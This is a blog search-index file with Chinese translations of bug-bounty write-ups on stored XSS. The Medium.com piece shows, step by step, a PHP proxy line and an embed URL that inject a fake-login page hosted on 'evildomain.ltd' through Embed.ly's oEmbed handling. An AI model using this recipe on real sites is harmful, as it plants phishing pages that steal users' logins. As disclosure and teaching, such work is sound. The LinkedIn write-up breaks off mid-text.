<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[第二十一篇：存储型XSS（前续）]]></title>
      <url>/2019/02/26/%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AF%87%EF%BC%9A%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%88%E5%89%8D%E7%BB%AD%EF%BC%89/</url>
      <content type="html"><![CDATA[<h4 id="原文：Persistent-XSS-Unvalidated-oEmbed-at-Medium-com"><a href="#原文：Persistent-XSS-Unvalidated-oEmbed-at-Medium-com" class="headerlink" title="原文：Persistent XSS (Unvalidated oEmbed) at Medium.com"></a>原文：<a href="https://medium.com/@jonathanbouman/stored-xss-unvalidated-embed-at-medium-com-528b0d6d4982" target="_blank" rel="external">Persistent XSS (Unvalidated oEmbed) at Medium.com</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：Jonathan-Bouman"><a href="#作者：Jonathan-Bouman" class="headerlink" title="作者：Jonathan Bouman"></a>作者：<a href="https://medium.com/@jonathanbouman" target="_blank" rel="external">Jonathan Bouman</a></h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/1.gif" alt=""></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h4 id="emsp-emsp-在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect-XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。"><a href="#emsp-emsp-在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect-XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。" class="headerlink" title="&emsp;&emsp;在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。"></a>&emsp;&emsp;在我们之前的一篇<a href="https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c" target="_blank" rel="external">报告</a>中，我们学会了关于反射型XSS的知识；<a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks" target="_blank" rel="external">reflect XSS</a>的缺点是我们需要欺骗用户访问攻击者构造好的URL。</h4><h4 id="emsp-emsp-但是，如果我们可以将我们的javascript代码存储在页面中呢？"><a href="#emsp-emsp-但是，如果我们可以将我们的javascript代码存储在页面中呢？" class="headerlink" title="&emsp;&emsp;但是，如果我们可以将我们的javascript代码存储在页面中呢？"></a>&emsp;&emsp;但是，如果我们可以将我们的javascript代码存储在页面中呢？</h4><h4 id="emsp-emsp-那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。"><a href="#emsp-emsp-那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。" class="headerlink" title="&emsp;&emsp;那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。"></a>&emsp;&emsp;那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。</h4><h4 id="emsp-emsp-一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium-com怎么样？他们的奖金超级丰厚"><a href="#emsp-emsp-一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium-com怎么样？他们的奖金超级丰厚" class="headerlink" title="&emsp;&emsp;一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium.com怎么样？他们的奖金超级丰厚"></a>&emsp;&emsp;一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium.com怎么样？他们的奖金超级丰厚</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/2.jpeg" alt=""></p>
<h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h4 id="emsp-emsp-存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。"><a href="#emsp-emsp-存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。" class="headerlink" title="&emsp;&emsp;存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。"></a>&emsp;&emsp;存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。</h4><h4 id="emsp-emsp-编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）"><a href="#emsp-emsp-编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）" class="headerlink" title="&emsp;&emsp;编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）"></a>&emsp;&emsp;编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/3.png" alt=""></p>
<h4 id="emsp-emsp-通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的-按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed"><a href="#emsp-emsp-通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的-按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed" class="headerlink" title="&emsp;&emsp;通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的(+)按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed"></a>&emsp;&emsp;通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的(+)按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/4.png" alt=""></p>
<p>[*]真正的oEmbed技术是将内容嵌入而不是图片，译者的博客没有集成类似的技术就只能图片代替</p>
<h4 id="emsp-emsp-如果你拥有一个像Medium-com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。"><a href="#emsp-emsp-如果你拥有一个像Medium-com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。" class="headerlink" title="&emsp;&emsp;如果你拥有一个像Medium.com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。"></a>&emsp;&emsp;如果你拥有一个像Medium.com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/5.jpeg" alt=""></p>
<p>[*]Embed.ly是Medium.com拥有的子公司</p>
<h4 id="emsp-emsp-为了验证我们的概念，我们做一个fake-login"><a href="#emsp-emsp-为了验证我们的概念，我们做一个fake-login" class="headerlink" title="&emsp;&emsp;为了验证我们的概念，我们做一个fake login"></a>&emsp;&emsp;为了验证我们的概念，我们做一个fake login</h4><h4 id="寻找漏洞，Embed-ly如何运作的？"><a href="#寻找漏洞，Embed-ly如何运作的？" class="headerlink" title="寻找漏洞，Embed.ly如何运作的？"></a>寻找漏洞，Embed.ly如何运作的？</h4><h4 id="emsp-emsp-首先，他们声明他们支持oEmbed规范；"><a href="#emsp-emsp-首先，他们声明他们支持oEmbed规范；" class="headerlink" title="&emsp;&emsp;首先，他们声明他们支持oEmbed规范；"></a>&emsp;&emsp;首先，他们声明他们支持oEmbed规范；</h4><h4 id="emsp-emsp-那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake-login页面。"><a href="#emsp-emsp-那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake-login页面。" class="headerlink" title="&emsp;&emsp;那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake login页面。"></a>&emsp;&emsp;那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake login页面。</h4><h4 id="emsp-emsp-很遗憾，只有经过批准的提供者才能嵌入他们的代码。"><a href="#emsp-emsp-很遗憾，只有经过批准的提供者才能嵌入他们的代码。" class="headerlink" title="&emsp;&emsp;很遗憾，只有经过批准的提供者才能嵌入他们的代码。"></a>&emsp;&emsp;很遗憾，只有经过批准的提供者才能嵌入他们的代码。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/7.png" alt=""></p>
<h4 id="emsp-emsp-让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed-ly的内部工作原理。"><a href="#emsp-emsp-让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed-ly的内部工作原理。" class="headerlink" title="&emsp;&emsp;让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed.ly的内部工作原理。"></a>&emsp;&emsp;让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed.ly的内部工作原理。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/8.png" alt=""></p>
<p>[*]1. 请求我们的Vimeo视频的request信息</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/9.png" alt=""></p>
<p>[*]2. oEmbed的响应信息，mediaResourceId是内部唯一标志符</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/10.png" alt=""></p>
<p>[*]3. POST请求，告诉Medium.com使用mediaResourceId包含我们的视频</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/11.png" alt=""></p>
<p>[*]4. 请求oEmbed HTML，用来显示oEmbed</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/12.jpeg" alt=""></p>
<p>[*]5. 响应oEmbed HTML，包含由Embed.ly托管的Vimeo播放器</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/13.png" alt=""></p>
<p>[*]6. 请求来自oEmbed HTML中iframe标签的内容</p>
<h4 id="emsp-emsp-值得注意的是，Embed-ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed-ly立即就能从缓存中提取，不必再去请求一遍。"><a href="#emsp-emsp-值得注意的是，Embed-ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed-ly立即就能从缓存中提取，不必再去请求一遍。" class="headerlink" title="&emsp;&emsp;值得注意的是，Embed.ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed.ly立即就能从缓存中提取，不必再去请求一遍。"></a>&emsp;&emsp;值得注意的是，Embed.ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed.ly立即就能从缓存中提取，不必再去请求一遍。</h4><h4 id="emsp-emsp-因此我们需要欺骗Embed-ly为我们的fake-login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake-login，这样当Medium请求mediaResourceId的时候就会加载我们的fake-login"><a href="#emsp-emsp-因此我们需要欺骗Embed-ly为我们的fake-login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake-login，这样当Medium请求mediaResourceId的时候就会加载我们的fake-login" class="headerlink" title="&emsp;&emsp;因此我们需要欺骗Embed.ly为我们的fake login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake login，这样当Medium请求mediaResourceId的时候就会加载我们的fake login"></a>&emsp;&emsp;因此我们需要欺骗Embed.ly为我们的fake login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake login，这样当Medium请求mediaResourceId的时候就会加载我们的fake login</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/14.png" alt=""></p>
<p>[*]7. 没有成功</p>
<h4 id="emsp-emsp-没有公共，我尝试了多种办法均没有达到效果！"><a href="#emsp-emsp-没有公共，我尝试了多种办法均没有达到效果！" class="headerlink" title="&emsp;&emsp;没有公共，我尝试了多种办法均没有达到效果！"></a>&emsp;&emsp;没有公共，我尝试了多种办法均没有达到效果！</h4><h4 id="emsp-emsp-所以我们必须考虑其它办法了。"><a href="#emsp-emsp-所以我们必须考虑其它办法了。" class="headerlink" title="&emsp;&emsp;所以我们必须考虑其它办法了。"></a>&emsp;&emsp;所以我们必须考虑其它办法了。</h4><h4 id="emsp-emsp-下面的代码是-截图6-的请求内容"><a href="#emsp-emsp-下面的代码是-截图6-的请求内容" class="headerlink" title="&emsp;&emsp;下面的代码是[截图6]的请求内容"></a>&emsp;&emsp;下面的代码是[截图6]的请求内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /widgets/media.html?src=https%3A%2F%2Fplayer.vimeo.com%2Fvideo%2F142424242%3Fapp_id%3D122963&amp;dntp=1&amp;url=https%3A%2F%2Fvimeo.com%2F142424242&amp;image=https%3A%2F%2Fi.vimeocdn.com%2Fvideo%2F540139087_1280.jpg&amp;key=b19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=vimeo</div></pre></td></tr></table></figure>
<h4 id="Decoded"><a href="#Decoded" class="headerlink" title="Decoded:"></a>Decoded:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /widgets/media.html?src=https://player.vimeo.com/video/142424242?app_id=122963&amp;dntp=1&amp;url=https://vimeo.com/142424242&amp;image=https://i.vimeocdn.com/video/540139087_1280.jpg&amp;key=b19fcc184b9711e1b4764040d3dc5c07&amp;type=text/html&amp;schema=vimeo</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-如果我们可以做某种中间人攻击-MITM-并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake-login页面。搜索指向Vimeo播放器的字符串https-player-vimeo-com-video-142424242-并将其更改为https-evildomain-ltd-fakelogin"><a href="#emsp-emsp-如果我们可以做某种中间人攻击-MITM-并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake-login页面。搜索指向Vimeo播放器的字符串https-player-vimeo-com-video-142424242-并将其更改为https-evildomain-ltd-fakelogin" class="headerlink" title="&emsp;&emsp;如果我们可以做某种中间人攻击[MITM]并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake login页面。搜索指向Vimeo播放器的字符串https://player.vimeo.com/video/142424242 并将其更改为https://evildomain.ltd/fakelogin"></a>&emsp;&emsp;如果我们可以做某种中间人攻击[MITM]并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake login页面。搜索指向Vimeo播放器的字符串<a href="https://player.vimeo.com/video/142424242" target="_blank" rel="external">https://player.vimeo.com/video/142424242</a> 并将其更改为<a href="https://evildomain.ltd/fakelogin" target="_blank" rel="external">https://evildomain.ltd/fakelogin</a></h4><h2 id="MITM-Attack"><a href="#MITM-Attack" class="headerlink" title="MITM Attack"></a><strong>MITM Attack</strong></h2><h4 id="1-快速设置：打开你的PHP服务器，上传fakelogin-html（包含正确设计的fake-login），上传proxy-php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）"><a href="#1-快速设置：打开你的PHP服务器，上传fakelogin-html（包含正确设计的fake-login），上传proxy-php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）" class="headerlink" title="1. 快速设置：打开你的PHP服务器，上传fakelogin.html（包含正确设计的fake login），上传proxy.php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）"></a>1. 快速设置：打开你的PHP服务器，上传fakelogin.html（包含正确设计的fake login），上传proxy.php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）</h4><h4 id="2-在proxy-php-第381行上面添加一行"><a href="#2-在proxy-php-第381行上面添加一行" class="headerlink" title="2. 在proxy.php 第381行上面添加一行"></a>2. 在proxy.php 第381行上面添加一行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//Parse the DOM:</div><div class="line">$responseBody = str_replace(&quot;https://player.vimeo.com/video/142424242&quot;, &quot;https://evildomain.ltd/embedly/fakelogin.html&quot;, $responseBody);</div></pre></td></tr></table></figure>
<h4 id="3-创建一个新的Medium文章"><a href="#3-创建一个新的Medium文章" class="headerlink" title="3. 创建一个新的Medium文章"></a>3. 创建一个新的Medium文章</h4><h4 id="4-嵌入网址https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242"><a href="#4-嵌入网址https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242" class="headerlink" title="4. 嵌入网址https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242"></a>4. 嵌入网址<a href="https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242" target="_blank" rel="external">https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242</a></h4><h4 id="5-Medium-com他们的服务器将从https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake-login页面而不是视频播放器"><a href="#5-Medium-com他们的服务器将从https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake-login页面而不是视频播放器" class="headerlink" title="5. Medium.com他们的服务器将从https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake login页面而不是视频播放器"></a>5. Medium.com他们的服务器将从<a href="https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake" target="_blank" rel="external">https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake</a> login页面而不是视频播放器</h4><h4 id="6-等待"><a href="#6-等待" class="headerlink" title="6. 等待"></a>6. 等待</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/15.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/16.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第二十篇：持久性XSS变异]]></title>
      <url>/2019/02/24/%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AF%87%EF%BC%9A%E6%8C%81%E4%B9%85%E6%80%A7XSS/</url>
      <content type="html"><![CDATA[<h4 id="原文：Persistent-XSS-unvalidated-Open-Graph-embed-at-LinkedIn-com"><a href="#原文：Persistent-XSS-unvalidated-Open-Graph-embed-at-LinkedIn-com" class="headerlink" title="原文：Persistent XSS (unvalidated Open Graph embed) at LinkedIn.com"></a>原文：<a href="https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9" target="_blank" rel="external">Persistent XSS (unvalidated Open Graph embed) at LinkedIn.com</a></h4><h4 id="漏洞：网站对Open-Graph标签内容过滤不严"><a href="#漏洞：网站对Open-Graph标签内容过滤不严" class="headerlink" title="漏洞：网站对Open Graph标签内容过滤不严"></a>漏洞：网站对Open Graph标签内容过滤不严</h4><h4 id="作者：Jonathan-Bouman"><a href="#作者：Jonathan-Bouman" class="headerlink" title="作者：Jonathan Bouman"></a>作者：<a href="https://medium.com/@jonathanbouman" target="_blank" rel="external">Jonathan Bouman</a></h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/1.gif" alt=""></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h4 id="emsp-emsp-在我之前的报告中，我们了解了一种特殊类型的持久性XSS攻击——the-unvalidated-oEmbed-attack。这种攻击允许我们通过oEmbed功能来注入我们的HTML和javascript代码。"><a href="#emsp-emsp-在我之前的报告中，我们了解了一种特殊类型的持久性XSS攻击——the-unvalidated-oEmbed-attack。这种攻击允许我们通过oEmbed功能来注入我们的HTML和javascript代码。" class="headerlink" title="&emsp;&emsp;在我之前的报告中，我们了解了一种特殊类型的持久性XSS攻击——the unvalidated oEmbed attack。这种攻击允许我们通过oEmbed功能来注入我们的HTML和javascript代码。"></a>&emsp;&emsp;在我之前的报告中，我们了解了一种特殊类型的持久性XSS攻击——<a href="https://medium.com/@jonathanbouman/stored-xss-unvalidated-embed-at-medium-com-528b0d6d4982" target="_blank" rel="external">the <strong>unvalidated oEmbed attack</strong></a>。这种攻击允许我们通过oEmbed功能来注入我们的HTML和javascript代码。</h4><h4 id="emsp-emsp-oEmbed是一种开放格式，用来将一个网站中的内容嵌入到另一个网站中。几乎所有富媒体平台都支持oEmbed标准。例如：你只需要将视频链接粘贴在文章中，即可轻松地将Youtube视频添加到Wordpress博客里。Wordpress会将此链接转换为HTML代码，这个HTML就会加载Youtube的视频播放器并且播放该视频。"><a href="#emsp-emsp-oEmbed是一种开放格式，用来将一个网站中的内容嵌入到另一个网站中。几乎所有富媒体平台都支持oEmbed标准。例如：你只需要将视频链接粘贴在文章中，即可轻松地将Youtube视频添加到Wordpress博客里。Wordpress会将此链接转换为HTML代码，这个HTML就会加载Youtube的视频播放器并且播放该视频。" class="headerlink" title="&emsp;&emsp;oEmbed是一种开放格式，用来将一个网站中的内容嵌入到另一个网站中。几乎所有富媒体平台都支持oEmbed标准。例如：你只需要将视频链接粘贴在文章中，即可轻松地将Youtube视频添加到Wordpress博客里。Wordpress会将此链接转换为HTML代码，这个HTML就会加载Youtube的视频播放器并且播放该视频。"></a>&emsp;&emsp;<a href="https://oembed.com/" target="_blank" rel="external">oEmbed是一种开放格式</a>，用来将一个网站中的内容嵌入到另一个网站中。几乎所有富媒体平台都支持oEmbed标准。例如：你只需要将视频链接粘贴在文章中，即可轻松地将Youtube视频添加到Wordpress博客里。Wordpress会将此链接转换为HTML代码，这个HTML就会加载Youtube的视频播放器并且播放该视频。</h4><h4 id="emsp-emsp-例如：如果我在本篇文章中粘贴我的推特个人资料链接，那么媒体平台将创建一个包含我的推特个人资料的框架，这就是oEmbed的功能。正如我们之前所了解的那样，它们易受攻击并且允许未经验证的oEmbeds。"><a href="#emsp-emsp-例如：如果我在本篇文章中粘贴我的推特个人资料链接，那么媒体平台将创建一个包含我的推特个人资料的框架，这就是oEmbed的功能。正如我们之前所了解的那样，它们易受攻击并且允许未经验证的oEmbeds。" class="headerlink" title="&emsp;&emsp;例如：如果我在本篇文章中粘贴我的推特个人资料链接，那么媒体平台将创建一个包含我的推特个人资料的框架，这就是oEmbed的功能。正如我们之前所了解的那样，它们易受攻击并且允许未经验证的oEmbeds。"></a>&emsp;&emsp;例如：如果我在本篇文章中粘贴我的推特个人资料链接，那么媒体平台将创建一个包含我的推特个人资料的框架，这就是oEmbed的功能。正如我们之前所了解的那样，它们易受攻击并且允许未经验证的oEmbeds。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/0.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/2.png" alt=""></p>
<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;[*]oEmbed端点由Twitter指定，Medium将其用于嵌入</p>
<h4 id="emsp-emsp-丰富视觉内容的另一种方法是使用-Open-Graph-Protocol。网站可以将Open-Graph标签添加到它们的网页，用来指定被嵌入的内容类型（图片、视频、gif）"><a href="#emsp-emsp-丰富视觉内容的另一种方法是使用-Open-Graph-Protocol。网站可以将Open-Graph标签添加到它们的网页，用来指定被嵌入的内容类型（图片、视频、gif）" class="headerlink" title="&emsp;&emsp;丰富视觉内容的另一种方法是使用 Open Graph Protocol。网站可以将Open Graph标签添加到它们的网页，用来指定被嵌入的内容类型（图片、视频、gif）"></a>&emsp;&emsp;丰富视觉内容的另一种方法是使用 <a href="http://ogp.me/" target="_blank" rel="external"><strong>Open Graph Protocol</strong></a>。网站可以将Open Graph标签添加到它们的网页，用来指定被嵌入的内容类型（图片、视频、gif）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/3.png" alt=""></p>
<p>[*]维基百科有一个<meta property="og:image" ...="">标签，它定义如果被嵌入到文章中应该显示图片</p>
<h4 id="emsp-emsp-大多数平台在嵌入内容之前都会先检查这些特定的oEmbed和Open-Graph标签的URL，他们按照特定的顺序执行检查操作。在检查完所有标签之后，他们才会决定是否嵌入以及怎样嵌入链接。"><a href="#emsp-emsp-大多数平台在嵌入内容之前都会先检查这些特定的oEmbed和Open-Graph标签的URL，他们按照特定的顺序执行检查操作。在检查完所有标签之后，他们才会决定是否嵌入以及怎样嵌入链接。" class="headerlink" title="&emsp;&emsp;大多数平台在嵌入内容之前都会先检查这些特定的oEmbed和Open Graph标签的URL，他们按照特定的顺序执行检查操作。在检查完所有标签之后，他们才会决定是否嵌入以及怎样嵌入链接。"></a>&emsp;&emsp;大多数平台在嵌入内容之前都会先检查这些特定的oEmbed和Open Graph标签的URL，他们按照特定的顺序执行检查操作。在检查完所有标签之后，他们才会决定是否嵌入以及怎样嵌入链接。</h4><h4 id="emsp-emsp-嵌入式的最大优点是读者不必离开博客就能查看到媒体丰富的内容（例如：视频，图像，演示文稿）。此外，对于媒体平台，如Vimeo和Youtube，这是增加他们访问量的好办法。"><a href="#emsp-emsp-嵌入式的最大优点是读者不必离开博客就能查看到媒体丰富的内容（例如：视频，图像，演示文稿）。此外，对于媒体平台，如Vimeo和Youtube，这是增加他们访问量的好办法。" class="headerlink" title="&emsp;&emsp;嵌入式的最大优点是读者不必离开博客就能查看到媒体丰富的内容（例如：视频，图像，演示文稿）。此外，对于媒体平台，如Vimeo和Youtube，这是增加他们访问量的好办法。"></a>&emsp;&emsp;嵌入式的最大优点是读者不必离开博客就能查看到媒体丰富的内容（例如：视频，图像，演示文稿）。此外，对于媒体平台，如Vimeo和Youtube，这是增加他们访问量的好办法。</h4><h4 id="emsp-emsp-大多数允许您嵌入外部内容的平台都具有白名单，只有白名单上域名的url才能被嵌入，比如Wordpress。您肯定不希望将未经验证的HTML代码注入到您的平台上。"><a href="#emsp-emsp-大多数允许您嵌入外部内容的平台都具有白名单，只有白名单上域名的url才能被嵌入，比如Wordpress。您肯定不希望将未经验证的HTML代码注入到您的平台上。" class="headerlink" title="&emsp;&emsp;大多数允许您嵌入外部内容的平台都具有白名单，只有白名单上域名的url才能被嵌入，比如Wordpress。您肯定不希望将未经验证的HTML代码注入到您的平台上。"></a>&emsp;&emsp;大多数允许您嵌入外部内容的平台都具有白名单，只有白名单上域名的url才能被嵌入，比如Wordpress。您肯定不希望将未经验证的HTML代码注入到您的平台上。</h4><h4 id="emsp-emsp-但是如果这个白名单失效了，并且我们能够将我们的恶意代码注入到目标平台的话会发生什么呢？"><a href="#emsp-emsp-但是如果这个白名单失效了，并且我们能够将我们的恶意代码注入到目标平台的话会发生什么呢？" class="headerlink" title="&emsp;&emsp;但是如果这个白名单失效了，并且我们能够将我们的恶意代码注入到目标平台的话会发生什么呢？"></a>&emsp;&emsp;但是如果这个白名单失效了，并且我们能够将我们的恶意代码注入到目标平台的话会发生什么呢？</h4><h4 id="emsp-emsp-之前我们已经证明过oEmbed是vulnerable的，现在再来看看我们是否可以通过操作Open-Graph标签再次攻陷目标，let’s-give-it-a-try"><a href="#emsp-emsp-之前我们已经证明过oEmbed是vulnerable的，现在再来看看我们是否可以通过操作Open-Graph标签再次攻陷目标，let’s-give-it-a-try" class="headerlink" title="&emsp;&emsp;之前我们已经证明过oEmbed是vulnerable的，现在再来看看我们是否可以通过操作Open Graph标签再次攻陷目标，let’s give it a try!"></a>&emsp;&emsp;之前我们已经证明过oEmbed是vulnerable的，现在再来看看我们是否可以通过操作Open Graph标签再次攻陷目标，let’s give it a try!</h4><h2 id="验证目标"><a href="#验证目标" class="headerlink" title="验证目标"></a>验证目标</h2><h4 id="emsp-emsp-如果让我们寻找在哪里可以嵌入外部内容的地方的话，博客往往是最好的选择。点击下图-Write-an-Article-按钮编辑文章"><a 